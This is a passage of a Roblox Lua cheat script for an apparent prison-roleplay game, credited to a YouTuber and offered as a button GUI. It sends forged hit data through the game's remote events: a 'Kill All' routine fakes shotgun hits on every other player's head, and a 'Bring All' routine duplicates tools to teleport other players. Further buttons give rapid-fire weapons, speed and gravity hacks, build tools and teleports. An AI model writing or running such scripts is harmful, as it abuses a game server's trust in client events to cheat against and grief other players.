Bullet.Anchored = true
Bullet.CanCollide = false
Bullet.Size = Vector3.new(0.2, 0.2, D)
Bullet.CFrame = C

local bulletTable = {}
table.insert(bulletTable, {
Hit = target,
Distance = D,
Cframe = C,
RayObject = R
})

game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
local C = Sound:Clone()
C.Parent = Gun
C:Play()
wait(0.05)
Bullet:Remove()
end))
end

Mouse.Button1Down:Connect(function()
Down = true
end)


Mouse.Button1Up:Connect(function()
Down = false
end)

while Run.Stepped:wait() do
if Down == true then
game.ReplicatedStorage.SoundEvent:FireServer(Sound, Gun)
FireLaser(Mouse.Target)
end
end
end)

fastm9.Name = "fastm9"
fastm9.Parent = main
fastm9.BackgroundColor3 = Color3.new(1, 0.333333, 0)
fastm9.Position = UDim2.new(0.267702788, 0, 0.518048167, 0)
fastm9.Size = UDim2.new(0, 84, 0, 32)
fastm9.Font = Enum.Font.Bodoni
fastm9.Text = "Fast M9"
fastm9.TextColor3 = Color3.new(0, 0, 0)
fastm9.TextSize = 14
fastm9.MouseButton1Down:connect(function()
local Player = game.Players.LocalPlayer.Name
local Gun = "M9" -- < -- Gun Name
local Run = game:GetService("RunService")

Gun = game.Players[Player].Character[Gun]
local Mouse = game.Players.LocalPlayer:GetMouse()
local Down = false
local Sound = Gun.Handle.FireSound

function CreateRay(Point_A, Point_B)
local Ray = Ray.new(Point_A, (Point_B - Point_A).Unit * (2 ^ 31 - 1))
local Part, Pos = workspace:FindPartOnRay(Ray, game.Players.LocalPlayer.Character)
local Dist = (Point_A - Pos).Magnitude
local CFrame = CFrame.new(Point_A, Pos) * CFrame.new(0, 0, -Dist / 2)

return CFrame, Dist, Ray
end

function FireLaser(target)
coroutine.resume(coroutine.create(function()
local C, D, R = CreateRay(Gun.Muzzle.CFrame.p, target.CFrame.p)
local Bullet = Instance.new("Part", Gun)
Bullet.BrickColor = BrickColor.Yellow()
Bullet.Material = "Neon"
Bullet.Anchored = true
Bullet.CanCollide = false
Bullet.Size = Vector3.new(0.2, 0.2, D)
Bullet.CFrame = C

local bulletTable = {}
table.insert(bulletTable, {
Hit = target,
Distance = D,
Cframe = C,
RayObject = R
})

game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
local C = Sound:Clone()
C.Parent = Gun
C:Play()
wait(0.05)
Bullet:Remove()
end))
end

Mouse.Button1Down:Connect(function()
Down = true
end)


Mouse.Button1Up:Connect(function()
Down = false
end)

while Run.Stepped:wait() do
if Down == true then
game.ReplicatedStorage.SoundEvent:FireServer(Sound, Gun)
FireLaser(Mouse.Target)
end
end
end)

fasttaze.Name = "fasttaze"
fasttaze.Parent = main
fasttaze.BackgroundColor3 = Color3.new(1, 0.333333, 0)
fasttaze.Position = UDim2.new(0.522364557, 0, 0.518048108, 0)
fasttaze.Size = UDim2.new(0, 84, 0, 32)
fasttaze.Font = Enum.Font.Bodoni
fasttaze.Text = "Fast Taser"
fasttaze.TextColor3 = Color3.new(0, 0, 0)
fasttaze.TextSize = 14
fasttaze.MouseButton1Down:connect(function()
local Player = game.Players.LocalPlayer.Name
local Gun = "Taser" -- < -- Gun Name
local Run = game:GetService("RunService")

Gun = game.Players[Player].Character[Gun]
local Mouse = game.Players.LocalPlayer:GetMouse()
local Down = false
local Sound = Gun.Handle.FireSound

function CreateRay(Point_A, Point_B)
local Ray = Ray.new(Point_A, (Point_B - Point_A).Unit * (2 ^ 31 - 1))
local Part, Pos = workspace:FindPartOnRay(Ray, game.Players.LocalPlayer.Character)
local Dist = (Point_A - Pos).Magnitude
local CFrame = CFrame.new(Point_A, Pos) * CFrame.new(0, 0, -Dist / 2)

return CFrame, Dist, Ray
end

function FireLaser(target)
coroutine.resume(coroutine.create(function()
local C, D, R = CreateRay(Gun.Muzzle.CFrame.p, target.CFrame.p)
local Bullet = Instance.new("Part", Gun)
Bullet.BrickColor = BrickColor.Yellow()
Bullet.Material = "Neon"
Bullet.Anchored = true
Bullet.CanCollide = false
Bullet.Size = Vector3.new(0.2, 0.2, D)
Bullet.CFrame = C

local bulletTable = {}
table.insert(bulletTable, {
Hit = target,
Distance = D,
Cframe = C,
RayObject = R
})

game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
local C = Sound:Clone()
C.Parent = Gun
C:Play()
wait(0.05)
Bullet:Remove()
end))
end

Mouse.Button1Down:Connect(function()
Down = true
end)


Mouse.Button1Up:Connect(function()
Down = false
end)

while Run.Stepped:wait() do
if Down == true then
game.ReplicatedStorage.SoundEvent:FireServer(Sound, Gun)
FireLaser(Mouse.Target)
end
end
end)

fastak.Name = "fastak"
fastak.Parent = main
fastak.BackgroundColor3 = Color3.new(1, 0.333333, 0)
fastak.Position = UDim2.new(0.77959609, 0, 0.518048167, 0)
fastak.Size = UDim2.new(0, 79, 0, 32)
fastak.Font = Enum.Font.Bodoni
fastak.Text = "Fast AK47"
fastak.TextColor3 = Color3.new(0, 0, 0)
fastak.TextSize = 14
fastak.MouseButton1Down:connect(function()
local Player = game.Players.LocalPlayer.Name
local Gun = "AK47" -- < -- Gun Name
local Run = game:GetService("RunService")

Gun = game.Players[Player].Character[Gun]
local Mouse = game.Players.LocalPlayer:GetMouse()
local Down = false
local Sound = Gun.Handle.FireSound

function CreateRay(Point_A, Point_B)
local Ray = Ray.new(Point_A, (Point_B - Point_A).Unit * (2 ^ 31 - 1))
local Part, Pos = workspace:FindPartOnRay(Ray, game.Players.LocalPlayer.Character)
local Dist = (Point_A - Pos).Magnitude
local CFrame = CFrame.new(Point_A, Pos) * CFrame.new(0, 0, -Dist / 2)

return CFrame, Dist, Ray
end

function FireLaser(target)
coroutine.resume(coroutine.create(function()
local C, D, R = CreateRay(Gun.Muzzle.CFrame.p, target.CFrame.p)
local Bullet = Instance.new("Part", Gun)
Bullet.BrickColor = BrickColor.Yellow()
Bullet.Material = "Neon"
Bullet.Anchored = true
Bullet.CanCollide = false
Bullet.Size = Vector3.new(0.2, 0.2, D)
Bullet.CFrame = C

local bulletTable = {}
table.insert(bulletTable, {
Hit = target,
Distance = D,
Cframe = C,
RayObject = R
})

game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
local C = Sound:Clone()
C.Parent = Gun
C:Play()
wait(0.05)
Bullet:Remove()
end))
end

Mouse.Button1Down:Connect(function()
Down = true
end)


Mouse.Button1Up:Connect(function()
Down = false
end)

while Run.Stepped:wait() do
if Down == true then
game.ReplicatedStorage.SoundEvent:FireServer(Sound, Gun)
FireLaser(Mouse.Target)
end
end
end)

killall.Name = "killall"
killall.Parent = main
killall.BackgroundColor3 = Color3.new(1, 0, 0)
killall.Position = UDim2.new(0.0102345012, 0, 0.760852396, 0)
killall.Size = UDim2.new(0, 110, 0, 34)
killall.Font = Enum.Font.GothamBold
killall.Text = "Kill All"
killall.TextColor3 = Color3.new(0, 0, 0)
killall.TextSize = 14
killall.MouseButton1Down:connect(function()
workspace.Remote.TeamEvent:FireServer("Medium stone grey")

game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP) 

wait(0.5)
function kill(a)
local A_1 =
{
[1] =
{
["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-391.152252, 8.65560055, -83.2166901)),
["Distance"] = 3.2524313926697,
["Cframe"] = CFrame.new(840.310791, 101.334137, 2267.87988, 0.0636406094, 0.151434347, -0.986416459, 0, 0.988420188, 0.151741937, 0.997972965, -0.00965694897, 0.0629036576),
["Hit"] = a.Character.Head
},
  [2] =
{
["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-392.481476, -8.44939327, -76.7261353)),
["Distance"] = 3.2699294090271,
["Cframe"] = CFrame.new(840.290466, 101.184189, 2267.93506, 0.0964837447, 0.0589403138, -0.993587971, 4.65661287e-10, 0.998245299, 0.0592165813, 0.995334625, -0.00571343815, 0.0963144377),
["Hit"] = a.Character.Head
},
[3] =
{
["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-389.21701, -2.50536323, -92.2163162)),
["Distance"] = 3.1665518283844,
["Cframe"] = CFrame.new(840.338867, 101.236496, 2267.80371, 0.0166504811, 0.0941716284, -0.995416701, 1.16415322e-10, 0.995554805, 0.0941846818, 0.999861419, -0.00156822044, 0.0165764652),
["Hit"] = a.Character.Head
},
[4] =
{
["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-393.353973, 3.13988972, -72.5452042)),
["Distance"] = 3.3218522071838,
["Cframe"] = CFrame.new(840.277222, 101.285957, 2267.9707, 0.117109694, 0.118740402, -0.985994935, -1.86264515e-09, 0.992826641, 0.119563118, 0.993119001, -0.0140019981, 0.116269611),
["Hit"] = a.Character.Head
},
[5] =
{
["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-390.73172, 3.2097764, -85.5477524)),
["Distance"] = 3.222757101059,
["Cframe"] = CFrame.new(840.317993, 101.286423, 2267.86035, 0.0517584644, 0.123365127, -0.991010666, 0, 0.992340803, 0.123530701, 0.99865967, -0.00639375951, 0.0513620302),
["Hit"] = a.Character.Head
}
}
local A_2 = game.Players.LocalPlayer.Backpack["Remington 870"]
local Event = game:GetService("ReplicatedStorage").ShootEvent
Event:FireServer(A_1, A_2)
Event:FireServer(A_1, A_2)
end

for i,v in pairs(game.Players:GetChildren())do
if v.Name ~= game.Players.LocalPlayer.Name then
kill(v)
end
end
wait(1)
workspace.Remote.TeamEvent:FireServer("Bright orange")
end)

btools.Name = "btools"
btools.Parent = main
btools.BackgroundColor3 = Color3.new(0, 1, 1)
btools.Position = UDim2.new(0.678933322, 0, 0.2304198, 0)
btools.Size = UDim2.new(0, 111, 0, 32)
btools.Font = Enum.Font.GothamBold
btools.Text = "Btools"
btools.TextColor3 = Color3.new(1, 0, 0)
btools.TextSize = 14
btools.MouseButton1Down:connect(function()
local tool1   = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
tool1.BinType = "Hammer"
end)

speed.Name = "speed"
speed.Parent = main
speed.BackgroundColor3 = Color3.new(0.333333, 1, 1)
speed.Position = UDim2.new(0.350194454, 0, 0.379678607, 0)
speed.Size = UDim2.new(0, 110, 0, 32)
speed.Font = Enum.Font.GothamBold
speed.Text = "Speed"
speed.TextColor3 = Color3.new(1, 0, 0)
speed.TextSize = 14
speed.MouseButton1Down:connect(function()
Speed = "100" -- Change to how fast you want to go

player = game.Players.LocalPlayer.Character
power = "WalkSpeed"
player.Humanoid[power] = Speed
wait()
player.HumanoidRootPart.CustomPhysicalProperties = PhysicalProperties.new(9e99, 9e99, 9e99, 9e99, 9e99)
wait()
repeat
game.Workspace.Gravity = 1000
wait()
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 287.5
wait()
until game.Players.LocalPlayer.Character.Humanoid.Health == 0
end)

respawn.Name = "respawn"
respawn.Parent = main
respawn.BackgroundColor3 = Color3.new(0.333333, 1, 1)
respawn.Position = UDim2.new(0.68041873, 0, 0.379084349, 0)
respawn.Size = UDim2.new(0, 111, 0, 32)
respawn.Font = Enum.Font.GothamBold
respawn.Text = "Fast Respawn"
respawn.TextColor3 = Color3.new(1, 0, 0)
respawn.TextSize = 14
respawn.MouseButton1Down:connect(function()
local A_1 = "\66\114\111\121\111\117\98\97\100\100"
local Event = game:GetService("Workspace").Remote.loadchar
Event:InvokeServer(A_1)
end)

Credits.Name = "Credits"
Credits.Parent = main
Credits.BackgroundColor3 = Color3.new(0, 0, 0)
Credits.Position = UDim2.new(0.0242873691, 0, 0.934491813, 0)
Credits.Size = UDim2.new(0, 352, 0, 31)
Credits.Font = Enum.Font.GothamBold
Credits.Text = "Made by JAKE11PRICE on YouTube"
Credits.TextColor3 = Color3.new(1, 1, 0)
Credits.TextSize = 14

prison.Name = "prison"
prison.Parent = main
prison.BackgroundColor3 = Color3.new(0, 1, 1)
prison.Position = UDim2.new(0.681462109, 0, 0.450664163, 0)
prison.Size = UDim2.new(0, 110, 0, 32)
prison.Font = Enum.Font.GothamBlack
prison.Text = "Prison"
prison.TextColor3 = Color3.new(1, 0, 0)
prison.TextSize = 14
prison.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(918.77,100,2379.07)
end)

yard.Name = "yard"
yard.Parent = main
yard.BackgroundColor3 = Color3.new(0.333333, 1, 1)
yard.Position = UDim2.new(0.0127276238, 0, 0.45231539, 0)
yard.Size = UDim2.new(0, 110, 0, 32)
yard.Font = Enum.Font.GothamBlack
yard.Text = "Yard"
yard.TextColor3 = Color3.new(1, 0, 0)
yard.TextSize = 14
yard.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(779.87,98,2458.93)
end)

crimbase.Name = "crimbase"
crimbase.Parent = main
crimbase.BackgroundColor3 = Color3.new(0.333333, 1, 1)
crimbase.Position = UDim2.new(0.348744512, 0, 0.451209784, 0)
crimbase.Size = UDim2.new(0, 110, 0, 32)
crimbase.Font = Enum.Font.GothamBlack
crimbase.Text = "Crim Base"
crimbase.TextColor3 = Color3.new(1, 0, 0)
crimbase.TextSize = 14
crimbase.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-943.46,94.13,2063.63)
end)

title_2.Name = "title"
title_2.Parent = main
title_2.BackgroundColor3 = Color3.new(0.333333, 1, 0)
title_2.Position = UDim2.new(0.000689314213, 0, 0.592849016, 0)
title_2.Size = UDim2.new(0, 364, 0, 26)
title_2.Font = Enum.Font.GothamBold
title_2.Text = "FUN FE COMMANDS!"
title_2.TextColor3 = Color3.new(0, 0, 0)
title_2.TextSize = 14

bringall.Name = "bringall"
bringall.Parent = main
bringall.BackgroundColor3 = Color3.new(1, 1, 0)
bringall.Position = UDim2.new(0.0220828541, 0, 0.704794765, 0)
bringall.Size = UDim2.new(0, 111, 0, 25)
bringall.Font = Enum.Font.GothamBold
bringall.Text = "Bring All"
bringall.TextColor3 = Color3.new(0, 0, 0)
bringall.TextSize = 14
bringall.MouseButton1Down:connect(function()
workspace.Remote.TeamEvent:FireServer("Bright blue")

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 2 - currentamount >= #game.Players:GetPlayers() * 6
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for _, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()

wait()

for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(.1)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
